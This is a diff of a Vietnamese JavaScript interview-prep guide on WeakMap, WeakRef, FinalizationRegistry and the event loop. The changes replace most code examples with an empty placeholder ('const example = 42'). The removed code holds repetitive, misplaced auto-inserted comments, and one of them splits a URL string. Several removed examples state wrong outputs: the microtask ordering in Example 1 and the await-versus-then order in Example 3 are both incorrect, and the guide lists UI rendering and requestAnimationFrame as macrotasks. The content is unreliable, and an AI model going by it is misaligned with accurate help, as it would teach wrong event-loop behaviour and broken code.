- // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
-const privateData = new WeakMap<object, { password: string }>();
-
-class User {
-  constructor(public username: string, password: string) {
- // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
-    privateData.set(this, { password });
-  }
-
-  checkPassword(input: string): boolean {
-    const data = privateData.get(this);
-    return data?.password === input;
-  }
-}
-
-const user = new User('john', 'secret123');
-console.log(user.checkPassword('secret123')); // Chú giải: true
-// Không thể access password từ bên ngoài
-
- // Chú giải: Use case 2: Metadata cho DOM elements
-const elementMetadata = new WeakMap<HTMLElement, { clicks: number; lastClicked: Date }>();
-
-function trackClicks(element: HTMLElement): void {
-  const metadata = elementMetadata.get(element) || { clicks: 0, lastClicked: new Date() };
-  metadata.clicks++;
-  metadata.lastClicked = new Date();
-  elementMetadata.set(element, metadata);
-}
-
-// Khi element removed khỏi DOM, metadata tự động cleaned up
-
- // Chú giải: Use case 3: Cache cho object methods
-const resultCache = new WeakMap<object, Map<string, any>>();
-
-function memoize(obj: any, methodName: string, fn: Function) {
-  if (!resultCache.has(obj)) {
-    resultCache.set(obj, new Map());
-  }
-
-  const cache = resultCache.get(obj)!;
-  const key = JSON.stringify(arguments);
-
-  if (cache.has(key)) {
-    return cache.get(key);
-  }
-
-  const result = fn();
-  cache.set(key, result);
-  return result;
-}
-
- // Chú giải: ============================================
-// 5. WEAKREF - Weak Reference đến Single Object
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation:
- * - WeakRef cho phép hold weak reference đến một object
- * - Object có thể bị GC bất cứ lúc nào
- * - Dùng deref() để get object (có thể return undefined nếu đã GC)
- * - KHÔNG dùng cho core logic vì non-deterministic
- * - Use case: Caches, observer patterns
- */
-let targetObj: any = { x: 1, data: 'important' };
-const weakRef = new WeakRef(targetObj);
-
- // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
-console.log(weakRef.deref()?.x); // Chú giải: 1
-
- // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
-targetObj = null;
-
-// Object có thể bị GC, deref() có thể return undefined
-setTimeout(() => {
-  const obj = weakRef.deref();
-  if (obj) {
-    console.log('Object still alive:', obj.x);
-  } else {
-    console.log('Object was garbage collected');
-  }
-}, 1000);
-
- // Chú giải: Use case: Image cache với automatic cleanup
-class ImageCache {
-  private cache = new Map<string, WeakRef<HTMLImageElement>>();
-
-  set(url: string, image: HTMLImageElement): void {
-    this.cache.set(url, new WeakRef(image));
-  }
-
-  get(url: string): HTMLImageElement | undefined {
-    const ref = this.cache.get(url);
-    if (!ref) return undefined;
-
-    const image = ref.deref();
-    if (!image) {
- // Thu gom rác tự động: runtime đánh dấu và quét các object không còn truy cập để giải phóng bộ nhớ.
-      this.cache.delete(url);
-      return undefined;
-    }
-
-    return image;
-  }
-}
-
-const imageCache = new ImageCache();
-
- // Chú giải: ============================================
- // Chú giải: 6. FINALIZATIONREGISTRY - Cleanup Callback khi Object Dies
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation:
- * - FinalizationRegistry cho phép đăng ký callback khi object được GC
- * - Callback nhận "held value" (metadata) không phải object itself
- * - KHÔNG reliable - callback có thể chạy muộn hoặc không chạy
- * - Use case: Cleanup external resources (files, connections, timers)
- */
-const registry = new FinalizationRegistry<string>((heldValue) => {
-  console.log(`Object ${heldValue} was garbage collected`);
- // Chú giải: Cleanup external resources here
- // Chú giải: e.g., close file handles, database connections, etc.
-});
-
-let myObj: any = { x: 1 };
- // Chú giải: Register object với held value "my-obj"
-registry.register(myObj, 'my-obj');
-
-myObj = null; // Object có thể bị GC sau đó
-// Callback sẽ chạy: "Object my-obj was garbage collected"
-
- // Chú giải: Use case: Resource cleanup
-class FileHandle {
-  private static registry = new FinalizationRegistry<number>((fileDescriptor) => {
-    console.log(`Closing file descriptor ${fileDescriptor}`);
- // Chú giải: Close actual file handle
- // Chú giải: closeFile(fileDescriptor);
-  });
-
-  constructor(private fd: number) {
- // Chú giải: Register for cleanup
-    FileHandle.registry.register(this, fd);
-  }
-
-  read(): string {
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-    return 'file content';
-  }
-}
-
- // Chú giải: Use case: Database connection pool
-class DatabaseConnection {
-  private static registry = new FinalizationRegistry<string>((connectionId) => {
-    console.log(`Cleanup connection ${connectionId}`);
- // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-  });
-
-  constructor(private id: string) {
-    DatabaseConnection.registry.register(this, id);
-  }
-}
-
- // Chú giải: Use case: Timer cleanup
-const timerRegistry = new FinalizationRegistry<number>((timerId) => {
-  console.log(`Clearing timer ${timerId}`);
-  clearInterval(timerId);
-});
-
-class AutoTimer {
-  private timerId: number;
-
-  constructor(callback: () => void, interval: number) {
-    this.timerId = window.setInterval(callback, interval);
-    timerRegistry.register(this, this.timerId);
-  }
-}
-
- // Chú giải: ============================================
- // Chú giải: 7. PRACTICAL COMPARISON - When to Use What
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation:
- * 
- * Use SET when:
- * - Cần unique values
- * - Cần check membership nhanh (O(1))
- * - Cần set operations (union, intersection)
- * 
- * Use MAP when:
- * - Cần key-value pairs với non-string keys
- * - Cần preserve insertion order
- * - Frequent additions/deletions
- * 
- * Use WEAKSET when:
- * - Track objects mà không prevent GC
- * - Mark/tag objects temporarily
- * 
- * Use WEAKMAP when:
- * - Private data cho objects
- * - Metadata/cache cho objects
- * - Automatic cleanup when objects die
- * 
- * Use WEAKREF when:
- * - Caches có thể expire
- * - Observer patterns
- * - Không cần guarantee object availability
- * 
- * Use FINALIZATIONREGISTRY when:
- * - Cleanup external resources
- * - Close file handles, connections
- * - NOT for critical logic (unreliable timing)
- */
-
- // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
-console.time('Set operations');
-const set = new Set();
-for (let i = 0; i < 100000; i++) {
-  set.add(i);
-}
-console.timeEnd('Set operations'); // Chú giải: ~5ms
-
-console.time('Object operations');
-const obj = {};
-for (let i = 0; i < 100000; i++) {
-  obj[i] = true;
-}
-console.timeEnd('Object operations'); // Chú giải: ~8ms
-
-console.time('Map operations');
-const map = new Map();
-for (let i = 0; i < 100000; i++) {
-  map.set(i, true);
-}
-console.timeEnd('Map operations'); // Chú giải: ~6ms
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🎯 Best Practices:**
@@ -1891,57 +582,9 @@ console.timeEnd('Map operations'); // Chú giải: ~6ms
 
 **⚠️ Common Mistakes:**
 
-```typescript
- // Chú giải: ❌ Sai: Sử dụng Object cho unique values
-let uniqueValues: { [key: string]: boolean } = {};
-uniqueValues['a'] = true;
-uniqueValues['b'] = true;
-uniqueValues['a'] = true; // Duplicate, nhưng không bị detect
-console.log(Object.keys(uniqueValues).length); // Chú giải: 2 (phải manually check)
-
-// ✅ Đúng: Sử dụng Set
-let uniqueValues2 = new Set(['a', 'b', 'a']); // Chú giải: Set(2) {"a", "b"}
-console.log(uniqueValues2.size); // Chú giải: 2 (automatic)
-
- // `WeakMap`/`WeakSet` giữ tham chiếu yếu: không ngăn đối tượng bị thu gom rác khi không còn tham chiếu mạnh, hữu ích cho cache không cố định.
-const weakSet = new WeakSet();
- // `WeakMap`/`WeakSet` giữ tham chiếu yếu: không ngăn đối tượng bị thu gom rác khi không còn tham chiếu mạnh, hữu ích cho cache không cố định.
-
-// ✅ Đúng: WeakSet chỉ với objects
-const weakSet2 = new WeakSet();
-weakSet2.add({ id: 1 }); // Chú giải: OK
-
- // `WeakMap`/`WeakSet` giữ tham chiếu yếu: không ngăn đối tượng bị thu gom rác khi không còn tham chiếu mạnh, hữu ích cho cache không cố định.
-const weakMap = new WeakMap();
- // `WeakMap`/`WeakSet` giữ tham chiếu yếu: không ngăn đối tượng bị thu gom rác khi không còn tham chiếu mạnh, hữu ích cho cache không cố định.
-
-// ✅ Đúng: WeakMap không iterable, chỉ get/set/has/delete
-weakMap.get(someKey);
-
-// ❌ Sai: Dựa vào WeakRef cho critical logic
-function getCachedData(key: string) {
-  const ref = cache.get(key);
-  return ref.deref().data; // Error nếu object đã GC!
-}
-
-// ✅ Đúng: Always check deref() result
-function getCachedData2(key: string) {
-  const ref = cache.get(key);
-  const obj = ref?.deref();
-  if (obj) {
-    return obj.data;
-  }
- // Chú giải: Fallback: fetch fresh data
-  return fetchData(key);
-}
-
- // Chú giải: ❌ Sai: Expect FinalizationRegistry callback chạy ngay
-registry.register(obj, 'data');
-obj = null;
-// Callback KHÔNG chạy ngay lập tức!
-
-// ✅ Đúng: FinalizationRegistry cho optional cleanup only
-// Không rely on timing, có backup cleanup mechanism
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **📊 Performance & Memory Considerations:**
@@ -1951,13 +594,14 @@ obj = null;
 - **WeakRef**: Minimal memory overhead, nhưng có CPU cost cho deref() checks
 - **FinalizationRegistry**: Minimal overhead, callback chạy async trong idle time
 ---
-## 06. 🔄 Q06: Event Loop - Cơ Chế Hoạt Động JavaScript (Technical Deep Dive)  
 
-**P1: Tên câu hỏi:** 🔄 Q06: Event Loop - Cơ Chế Hoạt Động JavaScript (Technical Deep Dive)  
+## 11. Q11: 🔄 Q06: Event Loop - Cơ Chế Hoạt Động JavaScript (Technical Deep Dive)
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🔄 Q06: Event Loop - Cơ Chế Hoạt Động JavaScript (Technical Deep Dive)
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 12. Q12: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
 
@@ -1971,48 +615,37 @@ obj = null;
 5. **Macrotask Queue (Hàng đợi ưu tiên thấp)**: setTimeout, setInterval, I/O, UI rendering.
 
 **♻️ Luồng Hoạt Động Event Loop (Chi Tiết):**
-```
-while (true) {
-  1. Thực thi TẤT CẢ code đồng bộ trong Call Stack (cho đến khi trống)
-  2. Thực thi TẤT CẢ Microtasks (Promise.then, queueMicrotask)
-     → Làm trống hoàn toàn Microtask Queue
-  3. Render UI (Chỉ trình duyệt - 60fps = 16ms/frame)
-  4. Thực thi MỘT Macrotask (setTimeout callback)
-  5. Quay lại bước 2 (kiểm tra Microtasks lại)
-}
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🔑 Điểm Khác Biệt Quan Trọng:**
 - **Microtask vs Macrotask**:
-  - Microtask chạy TẤT CẢ trước khi Event Loop tiếp tục.
-  - Macrotask chỉ chạy 1 task mỗi vòng lặp.
-  - Ưu tiên: Microtask > UI Render > Macrotask.
+- Microtask chạy TẤT CẢ trước khi Event Loop tiếp tục.
+- Macrotask chỉ chạy 1 task mỗi vòng lặp.
+- Ưu tiên: Microtask > UI Render > Macrotask.
 - **Trình duyệt vs Node.js**:
-  - Trình duyệt: Có giai đoạn render UI.
-  - Node.js: Có `process.nextTick()` (ưu tiên cao hơn Microtask) + 6 giai đoạn (timers, I/O, idle, poll, check, close).
+- Trình duyệt: Có giai đoạn render UI.
+- Node.js: Có `process.nextTick()` (ưu tiên cao hơn Microtask) + 6 giai đoạn (timers, I/O, idle, poll, check, close).
 
 **⚠️ Lỗi Thường Gặp:**
 - **Làm đói UI**: Microtasks vô hạn chặn rendering → UI đóng băng.
-  ```js
-  function loop() {
-    Promise.resolve().then(loop); // ❌ Chặn UI mãi mãi
-  }
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
 - **setTimeout(fn, 0) ≠ Tức thì**: Vẫn phải chờ Call Stack trống + Microtasks hoàn thành.
 - **Race Conditions**: Callbacks bất đồng bộ có thể thực thi không theo thứ tự mong đợi.
 
 **🎯 Ví Dụ Thực Tế:**
-```js
-console.log('1'); // Đồng bộ → Call Stack
-setTimeout(() => console.log('2'), 0); // Chú giải: Macrotask Queue
-Promise.resolve().then(() => console.log('3')); // Chú giải: Microtask Queue
-console.log('4'); // Đồng bộ → Call Stack
 
-// Kết quả: 1, 4, 3, 2
-// Lý do:
-// 1. Thực thi đồng bộ: log '1', '4'
-// 2. Call Stack trống → Kiểm tra Microtask → log '3'
-// 3. Kiểm tra Macrotask → log '2'
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **💡 Kiến Thức Senior:**
@@ -2033,78 +666,13 @@ console.log('4'); // Đồng bộ → Call Stack
 
 Giải thích chi tiết cơ chế hoạt động của JavaScript Engine với Event Loop, Call Stack, Web APIs, Microtask/Macrotask Queues, và Single Thread.
 
-
-
 **✅ Đáp Án Chi Tiết:**
 
 **🏗️ KIẾN TRÚC TỔNG QUAN:**
 
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                    JAVASCRIPT RUNTIME ENVIRONMENT                    │
-├─────────────────────────────────────────────────────────────────────┤
-│                                                                      │
-│  ┌────────────────────────────────────────────────────────────┐    │
-│  │              JAVASCRIPT ENGINE (V8, SpiderMonkey)           │    │
-│  ├────────────────────────────────────────────────────────────┤    │
-│  │                                                             │    │
-│  │  ┌─────────────────────────────────────────────────────┐  │    │
-│  │  │  🔥 CALL STACK (LIFO)                               │  │    │
-│  │  │  ────────────────────────────────────────────       │  │    │
-│  │  │  │ function3() │ ← Top (đang thực thi)              │  │    │
-│  │  │  │ function2() │                                     │  │    │
-│  │  │  │ function1() │                                     │  │    │
-│  │  │  │   main()    │ ← Bottom                            │  │    │
-│  │  │  └─────────────┘                                     │  │    │
-│  │  │                                                       │  │    │
-│  │  │  📦 HEAP (Memory Allocation)                         │  │    │
-│  │  │  • Objects, Arrays, Functions                        │  │    │
-│  │  └─────────────────────────────────────────────────────┘  │    │
-│  └────────────────────────────────────────────────────────────┘    │
-│                                                                      │
-│  ┌────────────────────────────────────────────────────────────┐    │
-│  │  🌐 WEB APIs (Browser/Node.js)                            │    │
-│  ├────────────────────────────────────────────────────────────┤    │
-│  │  • setTimeout() / setInterval()                            │    │
-│  │  • DOM Events (click, scroll, etc.)                        │    │
-│  │  • fetch() / XMLHttpRequest                                │    │
-│  │  • FileReader / Web Workers                                │    │
-│  │  • Geolocation / Notification                              │    │
-│  │  • IndexedDB / LocalStorage                                │    │
-│  └────────────────────────────────────────────────────────────┘    │
-│                             ↓ callbacks                             │
-│  ┌────────────────────────────────────────────────────────────┐    │
-│  │  ⚡ MICROTASK QUEUE (High Priority)                        │    │
-│  ├────────────────────────────────────────────────────────────┤    │
-│  │  • Promise.then() / Promise.catch()                        │    │
-│  │  • queueMicrotask()                                        │    │
-│  │  • MutationObserver                                        │    │
-│  │  • process.nextTick() (Node.js only - highest priority)   │    │
-│  └────────────────────────────────────────────────────────────┘    │
-│                                                                      │
-│  ┌────────────────────────────────────────────────────────────┐    │
-│  │  🎯 MACROTASK QUEUE (Task Queue - Low Priority)           │    │
-│  ├────────────────────────────────────────────────────────────┤    │
-│  │  • setTimeout() / setInterval()                            │    │
-│  │  • setImmediate() (Node.js only)                           │    │
-│  │  • I/O operations (fs, network)                            │    │
-│  │  • UI rendering (Browser only)                             │    │
-│  │  • requestAnimationFrame() (Browser only)                  │    │
-│  └────────────────────────────────────────────────────────────┘    │
-│                                                                      │
-│                          ↑                                           │
-│  ┌────────────────────────────────────────────────────────────┐    │
-│  │  🔄 EVENT LOOP (Infinite Loop)                             │    │
-│  ├────────────────────────────────────────────────────────────┤    │
-│  │  while (true) {                                            │    │
-│  │    1. Check Call Stack → Execute sync code                │    │
-│  │    2. Check Microtask Queue → Execute ALL                 │    │
-│  │    3. Render UI (if needed - browser only)                │    │
-│  │    4. Check Macrotask Queue → Execute ONE                 │    │
-│  │    5. Go back to step 1                                   │    │
-│  │  }                                                         │    │
-│  └────────────────────────────────────────────────────────────┘    │
-└─────────────────────────────────────────────────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -2135,41 +703,17 @@ Giải thích chi tiết cơ chế hoạt động của JavaScript Engine với 
 - Khi function return, nó được pop ra khỏi stack
 
 **Hoạt động:**
-```typescript
-function multiply(a: number, b: number): number {
-  return a * b; // Chú giải: ③ Pop
-}
 
-function square(n: number): number {
-  return multiply(n, n); // Chú giải: ② Push multiply → Pop
-}
-
-function printSquare(n: number): void {
-  const result = square(n); // Chú giải: ① Push square
-  console.log(result);
-}
-
-printSquare(5);
-
- // Ngăn xếp gọi (call stack) thực thi mã đồng bộ theo nguyên tắc LIFO; tác vụ dài chặn UI.
- // Chú giải: → main()
- // Chú giải: → main() → printSquare(5)
- // Chú giải: → main() → printSquare(5) → square(5)
- // Chú giải: → main() → printSquare(5) → square(5) → multiply(5, 5)
- // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
- // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
- // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
- // Chú giải: → [empty]
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Stack Overflow:**
-```typescript
-// ❌ Recursive function không có điều kiện dừng
-function recursiveFunction() {
-  recursiveFunction(); // Tạo vô hạn stack frames
-}
 
-recursiveFunction(); // Ngăn xếp gọi (call stack) thực thi mã đồng bộ theo nguyên tắc LIFO; tác vụ dài chặn UI.
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -2183,36 +727,9 @@ recursiveFunction(); // Ngăn xếp gọi (call stack) thực thi mã đồng b�
 
 **Các Web APIs phổ biến:**
 
-```typescript
- // Chú giải: A. Timers
-setTimeout(() => console.log('Timer done'), 1000);
-setInterval(() => console.log('Tick'), 1000);
-
- // Chú giải: B. DOM Events
-document.getElementById('btn').addEventListener('click', () => {
-  console.log('Button clicked');
-});
-
- // Chú giải: C. Network Requests
-fetch('https: // Chú giải: api.example.com/data')
-  .then(response => response.json())
-  .then(data => console.log(data));
-
- // Chú giải: D. File APIs
-const reader = new FileReader();
-reader.onload = (e) => console.log(e.target.result);
-reader.readAsText(file);
-
- // Chú giải: E. Observers
-const observer = new IntersectionObserver((entries) => {
-  console.log('Element intersected');
-});
-
- // Chú giải: F. Geolocation
-navigator.geolocation.getCurrentPosition(
-  (position) => console.log(position.coords),
-  (error) => console.error(error)
-);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -2225,20 +742,10 @@ navigator.geolocation.getCurrentPosition(
 - Ưu tiên: **process.nextTick()** > **Promise** > **queueMicrotask**
 
 **Các Microtasks:**
-```typescript
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-Promise.resolve().then(() => console.log('Microtask 1'));
 
- // Chú giải: 2. queueMicrotask()
-queueMicrotask(() => console.log('Microtask 2'));
-
- // Chú giải: 3. MutationObserver
-const observer = new MutationObserver(() => {
-  console.log('DOM mutated - Microtask 3');
-});
-
- // Chú giải: 4. process.nextTick() - Node.js only (highest priority)
-process.nextTick(() => console.log('NextTick - Microtask 0'));
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -2251,21 +758,10 @@ process.nextTick(() => console.log('NextTick - Microtask 0'));
 - Sau mỗi macrotask, xử lý ALL microtasks
 
 **Các Macrotasks:**
-```typescript
- // `setTimeout`/`setInterval` nằm trong macrotasks; nhớ clear khi không cần để tránh rò rỉ bộ nhớ.
-setTimeout(() => console.log('Macrotask 1'), 0);
-setInterval(() => console.log('Macrotask 2'), 1000);
 
- // Chú giải: 2. setImmediate - Node.js only
-setImmediate(() => console.log('Macrotask 3'));
-
- // Chú giải: 3. I/O operations
-fs.readFile('file.txt', (err, data) => {
-  console.log('File read - Macrotask 4');
-});
-
- // Chú giải: 4. UI rendering events (Browser)
-requestAnimationFrame(() => console.log('RAF - Macrotask 5'));
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -2274,52 +770,18 @@ requestAnimationFrame(() => console.log('RAF - Macrotask 5'));
 
 **Thuật toán Event Loop:**
 
-```
-┌───────────────────────────┐
-│    1. Execute Call Stack  │  → Chạy hết synchronous code
-│       (synchronous code)  │
-└──────────┬────────────────┘
-           │
-           ↓
-┌───────────────────────────┐
-│  2. Check Microtask Queue │  → Xử lý HẾT TẤT CẢ microtasks
-│     - process.nextTick()  │     (bao gồm cả microtasks mới tạo)
-│     - Promise callbacks   │
-│     - queueMicrotask()    │
-└──────────┬────────────────┘
-           │
-           ↓
-┌───────────────────────────┐
-│   3. Render UI (Browser)  │  → Update DOM, paint, reflow
-│      (if needed)          │     (chỉ browser, không phải Node.js)
-└──────────┬────────────────┘
-           │
-           ↓
-┌───────────────────────────┐
-│  4. Check Macrotask Queue │  → Lấy MỘT macrotask
-│     - setTimeout()        │     (chỉ 1 cái duy nhất)
-│     - setImmediate()      │
-│     - I/O callbacks       │
-└──────────┬────────────────┘
-           │
-           ↓
-┌───────────────────────────┐
-│   5. Go back to Step 1    │  → Lặp lại vô hạn
-└───────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **🔢 THỨ TỰ ƯU TIÊN:**
 
-```
-1️⃣ Call Stack (Synchronous code)         - Cao nhất
-2️⃣ process.nextTick() (Node.js)          - Rất cao
-3️⃣ Promise microtasks                    - Cao
-4️⃣ queueMicrotask()                      - Cao
-5️⃣ setTimeout(fn, 0) / setInterval()     - Thấp
-6️⃣ setImmediate() (Node.js)              - Thấp hơn
-7️⃣ I/O operations                        - Thấp nhất
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -2340,219 +802,37 @@ requestAnimationFrame(() => console.log('RAF - Macrotask 5'));
 
 **🔍 Ví dụ 1: Phân biệt Microtask vs Macrotask**
 
-```typescript
-console.log('1: Sync code start'); // Ngăn xếp gọi (call stack) thực thi mã đồng bộ theo nguyên tắc LIFO; tác vụ dài chặn UI.
-
-setTimeout(() => console.log('2: Macrotask 1'), 0); // Chú giải: ④ Macrotask Queue
-setTimeout(() => console.log('3: Macrotask 2'), 0); // Chú giải: ④ Macrotask Queue
-
-Promise.resolve()
-  .then(() => console.log('4: Microtask 1')) // Chú giải: ② Microtask Queue
-  .then(() => console.log('5: Microtask 2')); // Chú giải: ② Microtask Queue (chained)
-
-Promise.resolve().then(() => {
-  console.log('6: Microtask 3');
-
-  // ⚠️ Tạo thêm microtask TRONG microtask
-  queueMicrotask(() => console.log('7: Microtask 4'));
-});
-
-console.log('8: Sync code end'); // Ngăn xếp gọi (call stack) thực thi mã đồng bộ theo nguyên tắc LIFO; tác vụ dài chặn UI.
-
-/* 🎯 OUTPUT (theo thứ tự Event Loop):
-1: Sync code start          // ① Call Stack: đồng bộ
-8: Sync code end            // ① Call Stack: đồng bộ
-4: Microtask 1              // ② ALL Microtasks (xử lý HẾT)
-6: Microtask 3 // Chú giải: ② ALL Microtasks
-7: Microtask 4              // ② ALL Microtasks (tạo thêm trong microtask)
-5: Microtask 2 // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-2: Macrotask 1              // ④ ONE Macrotask (chỉ lấy 1 cái)
-3: Macrotask 2              // ④ ONE Macrotask (chu kỳ Event Loop tiếp theo)
-
-📋 Giải thích từng bước:
-1. Call Stack chạy hết code đồng bộ (1, 8)
-2. Event Loop xử lý HẾT TẤT CẢ microtasks (4, 6, 7, 5)
-3. Browser có thể render UI (nếu cần)
-4. Event Loop lấy MỘT macrotask (2)
-5. Quay lại bước 1, xử lý microtasks rồi lấy macrotask tiếp theo (3)
-*/
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🔍 Ví dụ 2: Microtask Starvation (Đói macrotask)**
 
-```typescript
-console.log('Start');
-
-setTimeout(() => {
-  console.log('❌ Macrotask: Tôi sẽ KHÔNG BAO GIỜ chạy!');
-}, 0);
-
-// ⚠️ VÔ HẠN microtasks - CHẶN tất cả macrotasks
-function infiniteMicrotasks() {
-  Promise.resolve().then(() => {
-    console.log('✅ Microtask: Chạy mãi không dừng...');
-    infiniteMicrotasks(); // Tạo thêm microtask liên tục
-  });
-}
-
-infiniteMicrotasks();
-
-/*
-⚠️ KẾT QUẢ:
-- "Start" in ra
-- Microtask in ra vô hạn lần
-- setTimeout KHÔNG BAO GIỜ chạy vì Event Loop mắc kẹt ở Microtask Queue!
-
-💡 Bài học: Phải cẩn thận khi tạo microtask trong microtask
-*/
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🔍 Ví dụ 3: Call Stack với Async/Await**
 
-```typescript
-async function asyncFunction() {
-  console.log('2: Inside async - before await');
-
-  await Promise.resolve(); // Chú giải: ⚡ await tạo microtask
-
-  console.log('5: After await (microtask)');
-}
-
-console.log('1: Start');
-asyncFunction();
-console.log('3: After calling async');
-
-Promise.resolve().then(() => console.log('4: Promise.then (microtask)'));
-
-setTimeout(() => console.log('6: setTimeout (macrotask)'), 0);
-
-/* OUTPUT:
-1: Start
-2: Inside async - before await
-3: After calling async
-4: Promise.then (microtask)
-5: After await (microtask)
-6: setTimeout (macrotask)
-
-📋 Giải thích:
-- `await` biến code phía sau thành microtask
-- Tất cả microtasks (4, 5) chạy trước macrotask (6)
-*/
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🔍 Ví dụ 4: Thực Tế trong Trading App**
 
-```typescript
-interface OrderUpdate {
-  orderId: string;
-  status: 'pending' | 'filled';
-  price: number;
-}
-
-class TradingUI {
-  private pendingUpdates: OrderUpdate[] = [];
-
-  // ❌ BAD: Mỗi update render ngay (gây lag)
-  updateOrderBad(order: OrderUpdate) {
-    this.renderOrder(order); // Chú giải: Render ngay lập tức
-  }
-
- // Chú giải: ✅ GOOD: Batch updates với microtask
-  updateOrderGood(order: OrderUpdate) {
-    this.pendingUpdates.push(order);
-
-    // queueMicrotask: Batch tất cả updates trong cùng 1 tick
-    queueMicrotask(() => {
-      if (this.pendingUpdates.length > 0) {
-        this.renderBatch(this.pendingUpdates);
-        this.pendingUpdates = [];
-      }
-    });
-  }
-
-  private renderOrder(order: OrderUpdate) {
-    console.log(`Render single order: ${order.orderId}`);
- // Chú giải: DOM update expensive
-  }
-
-  private renderBatch(orders: OrderUpdate[]) {
-    console.log(`Render ${orders.length} orders in 1 batch`);
-    // DOM update once - HIỆU QUẢ HƠN!
-  }
-}
-
- // Chú giải: Test
-const ui = new TradingUI();
-
-// Giả sử nhận 100 updates cùng lúc từ WebSocket
-for (let i = 0; i < 100; i++) {
-  ui.updateOrderGood({
-    orderId: `ORD-${i}`,
-    status: 'filled',
-    price: 100 + i,
-  });
-}
-
-/* 🎯 KẾT QUẢ:
-❌ updateOrderBad: Render 100 lần → LAG UI
-✅ updateOrderGood: Render 1 lần với 100 items → SMOOTH UI
-
-💡 Microtask giúp batch operations trong cùng 1 Event Loop tick
-*/
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Best Practices:**
 
-```typescript
- // Chú giải: ✅ DO: Sử dụng microtask cho batch operations
-class StateManager {
-  private updates: Set<() => void> = new Set();
-  private scheduled = false;
-
-  scheduleUpdate(callback: () => void) {
-    this.updates.add(callback);
-
-    if (!this.scheduled) {
-      this.scheduled = true;
-      queueMicrotask(() => {
-        this.updates.forEach((cb) => cb());
-        this.updates.clear();
-        this.scheduled = false;
-      });
-    }
-  }
-}
-
- // Chú giải: ✅ DO: Sử dụng macrotask cho defer work
-function deferExpensiveWork(work: () => void) {
-  setTimeout(work, 0); // Chú giải: Chạy sau khi UI render
-}
-
-// ❌ DON'T: Tạo vô hạn microtasks
-function badInfiniteMicrotask() {
-  Promise.resolve().then(() => badInfiniteMicrotask()); // CHẶN macrotasks!
-}
-
-// ✅ DO: Break vòng lặp với macrotask
-function goodDeferWork(count: number) {
-  if (count > 0) {
-    setTimeout(() => goodDeferWork(count - 1), 0); // Cho phép UI render
-  }
-}
-
-// ✅ DO: Hiểu thứ tự execution để debug
-async function debugEventLoop() {
-  console.log('1: Sync');
-
-  queueMicrotask(() => console.log('3: Microtask'));
-
-  await Promise.resolve();
-  console.log('4: After await (microtask)');
-
-  setTimeout(() => console.log('5: Macrotask'), 0);
-
-  console.log('2: Sync end');
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **📋 Tóm tắt Best Practices:**
@@ -2565,67 +845,9 @@ async function debugEventLoop() {
 
 **Common Mistakes:**
 
-```typescript
-// ❌ MISTAKE 1: Nghĩ setTimeout(fn, 0) chạy ngay lập tức
-console.log('1');
-setTimeout(() => console.log('2'), 0);
-console.log('3');
-// Output: 1, 3, 2 (KHÔNG phải 1, 2, 3!)
-// ⚠️ setTimeout là macrotask, chạy sau tất cả microtasks
-
-// ❌ MISTAKE 2: Quên Promise.then là microtask
-setTimeout(() => console.log('1: Macro'), 0);
-Promise.resolve().then(() => console.log('2: Micro'));
- // Chú giải: Output: 2, 1 (microtask chạy TRƯỚC macrotask!)
-
- // Vòng lặp sự kiện điều phối call stack, microtasks và macrotasks; microtasks (ví dụ: `Promise.then`) chạy trước macrotasks (`setTimeout`).
-function heavyCalculation() {
-  const start = Date.now();
-  while (Date.now() - start < 5000) {} // Block 5 giây!
-  console.log('Done');
-}
-
-heavyCalculation(); // UI đóng băng 5 giây!
-
-// ✅ FIX: Break thành chunks với setTimeout
-function heavyCalculationFixed(iterations: number, callback: () => void) {
-  const chunkSize = 100;
-  let current = 0;
-
